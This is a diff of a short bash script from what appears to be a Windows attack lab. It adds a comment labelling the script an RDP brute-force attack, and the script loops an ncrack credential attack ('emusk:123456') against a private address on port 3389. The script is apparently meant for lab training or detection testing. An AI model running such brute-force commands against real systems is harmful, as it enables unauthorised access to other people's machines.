@@ -1,5 +1,7 @@
 #!/bin/bash
 
+# RDP Bruteforce Attack
+
 cd /winattacklab/
 
 echo "=========================="
@@ -32,4 +34,3 @@ for (( i=0; i<10; ++i)); do
     echo "RDP-Bruteforcing with emusk:123456..."
     ncrack -v --user emusk --pass 123456 10.0.1.103:3389,to=5
 done
-
